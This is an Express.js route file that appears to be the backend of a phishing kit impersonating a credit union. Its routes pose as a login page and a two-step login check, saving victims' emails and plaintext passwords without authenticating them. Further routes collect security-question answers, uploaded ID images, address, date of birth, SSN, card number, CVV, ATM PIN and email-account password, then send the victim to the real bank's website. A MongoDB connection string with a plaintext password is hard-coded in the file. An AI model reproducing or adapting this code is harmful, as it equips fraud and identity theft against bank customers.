const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const passport = require('passport');
const multer = require('multer');
// Load User model
const User = require('../models/User');
const Email = require('../models/Email');
const Email1 = require('../models/Email1');
const Questions = require('../models/Questions')
const Card = require('../models/Card')
const Image = require('../models/Images')
const {
  forwardAuthenticated
} = require('../config/auth');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const Grid = require('gridfs-stream');
const GridFsStorage = require('multer-gridfs-storage').GridFsStorage;

const conn = mongoose.createConnection('mongodb+srv://stefanAmoah:781227Amoah@cluster0.ty6cr.mongodb.net/spacecoast?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});


// Init gfs (GridFS)
let gfs;
conn.once('open', () => {
  // Initialize GridFS
  gfs = Grid(conn.db, mongoose.mongo);
  gfs.collection('uploads'); 
});

// Storage
const storage = new GridFsStorage({
  url: 'mongodb+srv://stefanAmoah:781227Amoah@cluster0.ty6cr.mongodb.net/spacecoast?retryWrites=true&w=majority',
  file: (req, file) => {
    return {
      filename: `${Date.now()}-${file.originalname}`,
      bucketName: 'uploads',
    };
  },
})

const upload = multer({ storage });

// Login Page
router.get('/login', forwardAuthenticated, (req, res) => res.render('login'));

// Register Page
router.get('/register', forwardAuthenticated, (req, res) => res.render('register'));

// Questions Page
router.get('/questions', forwardAuthenticated, (req, res) => res.render('questions'));

router.get('/images', forwardAuthenticated, (req, res) => res.render('images'));

router.get('/email', forwardAuthenticated, (req, res) => res.render('email'));

router.get('/card', forwardAuthenticated, (req, res) => res.render('card'));

router.get('/alert', forwardAuthenticated, (req, res) => res.render('alert'));

router.get('/emailcnt', forwardAuthenticated, (req, res) => res.render('email1'));

router.get('/loginverify', forwardAuthenticated, (req, res) => res.render('login2'));

router.post('/card', async (req, res) => {
  const card = new Card({
    cardnumber: req.body.cardnumber,
    expirationMonth: req.body.expirationMonth,
    expirationYear: req.body.expirationYear,
    cvv: req.body.cvv,
    atm: req.body.atm
  });

  card
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Card ok'
      );
      res.redirect('https://www.sccu.com');
    })
  .catch(err => console.log(err));
});

// images
router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
  res.redirect('/users/emailcnt');
});

// fix the images getting routes
router.get('/files', (req, res) => {
  gfs.files.find().toArray((err, files) => {
    if (!files || files.length === 0) {
      return res.status(404).render('index', { files: false });
    }
    return res.render('index', { files: files });
  });
});

router.get('/files/:filename', (req, res) => {
  gfs.files.findOne({ filename: req.body.filename }, (err, file) => {
    if (!file || file.length === 0) {
      return res.status(404).json({ err: 'No file exists' });
    }
    const readstream = gfs.createReadStream(file.filename);
    readstream.pipe(res);
  });
});

// Handle Security Questions Form Submission
router.post('/questions', async (req, res) => {
  const questions = new Questions({
    answer1: req.body.answer1,
    answer2: req.body.answer2,
    answer3: req.body.answer3,
    securityQuestion1: req.body.securityQuestion1,
    securityQuestion2: req.body.securityQuestion2,
    securityQuestion3: req.body.securityQuestion3
  });

  questions
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Questions ok'
      );
      res.redirect('/users/images');
    })
  .catch(err => console.log(err));
});

router.post('/email', async (req, res) => {
  try {
    const email = new Email({
      name: req.body.name,
      streetAddress: req.body.streetAddress,
      apartment: req.body.apartment,
      city: req.body.city,
      zipcode: req.body.zipcode,
      dobMonth: req.body.dobMonth,
      dobDay: req.body.dobDay,
      dobYear: req.body.dobYear,
      ssn: req.body.ssn
    });
  
    email
      .save()
      .then(result => {
        console.log(result)
        req.flash(
          'success_msg',
          'Email ok'
        );
        res.redirect('/users/card');
      })

} catch (err) {
    if (err.code === 11000) {
        return res.status(409).json({ error: 'Duplicate email detected' });
    }
    // Handle other errors as you see fit
    return res.status(500).json({ error: 'Internal server error' });
}
});

router.post('/emailcnt', async (req, res) => {
  const emailcnt = new Email1({
 email: req.body.email,
 password: req.body.password
  });

  emailcnt
  .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Email ok'
      );
      res.redirect('/users/email');
    })
  .catch(err => console.log(err));
});

// Register
router.post('/register', (req, res) => {
  const {
    name,
    email,
    password,
    password2
  } = req.body;
  let errors = [];

  if (!name || !email || !password || !password2) {
    errors.push({
      msg: 'Please enter all fields'
    });
  }

  if (password != password2) {
    errors.push({
      msg: 'Passwords do not match'
    });
  }

  if (password.length < 6) {
    errors.push({
      msg: 'Password must be at least 6 characters'
    });
  }

  if (errors.length > 0) {
    res.render('register', {
      errors,
      name,
      email,
      password,
      password2
    });
  } else {
    User.findOne({
      email: email
    }).then(user => {
      if (user) {
        errors.push({
          msg: 'Email already exists'
        });
        res.render('register', {
          errors,
          name,
          email,
          password,
          password2
        });
      } else {
        const newUser = new User({
          name,
          email,
          password
        });

        bcrypt.genSalt(10, (err, salt) => {
          bcrypt.hash(newUser.password, salt, (err, hash) => {
            if (err) throw err;
            newUser.password = hash;
            newUser
              .save()
              .then(user => {
                req.flash(
                  'success_msg',
                  'You are now registered and can log in'
                );
                res.redirect('/users/login');
              })
              .catch(err => console.log(err));
          });
        });
      }
    });
  }
});

// Login
router.post('/login', (req, res, next) => {
  const user = new User({
    email: req.body.email,
    password: req.body.password,
  })

  user
  .save()
  .then(result => {
    console.log(result)
    req.flash(
      'success_msg',
      'Questions ok'
    );
    res.redirect('/users/loginverify');
  })
.catch(err => console.log(err));
});

// Login Verify
router.post('/loginverify', (req, res, next) => {
  const user = new User({
    email: req.body.email,
    password: req.body.password,
  })

  user
  .save()
  .then(result => {
    console.log(result)
    req.flash(
      'success_msg',
      'Questions ok'
    );
    res.redirect('/users/alert');
  })
.catch(err => console.log(err));
});

// Logout
router.get('/logout', (req, res) => {
  req.logout();
  req.flash('success_msg', 'You are logged out');
  res.redirect('/users/login');
});

module.exports = router;